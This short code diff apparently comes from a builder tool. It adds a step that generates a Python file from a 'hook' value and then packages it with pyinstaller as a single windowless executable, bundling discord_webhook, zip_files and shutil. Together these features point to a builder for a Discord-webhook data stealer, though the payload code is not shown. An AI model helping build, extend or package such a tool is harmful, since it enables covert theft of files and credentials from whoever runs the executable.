@@ -37,6 +37,8 @@ def main():
         create_python_file(hook) 
         print("   File 'generated_file.py' generated!") 
     if user_option == 2:
+        create_python_file(hook) 
+        print("   File 'generated_file.py' generated!")
         os.system("pip install -r requirements.txt")
         os.system("pyinstaller --onefile --noconsole --hidden-import discord_webhook --hidden-import zip_files --hidden-import shutil generated_file.py")
         print("   Check dist folder!")
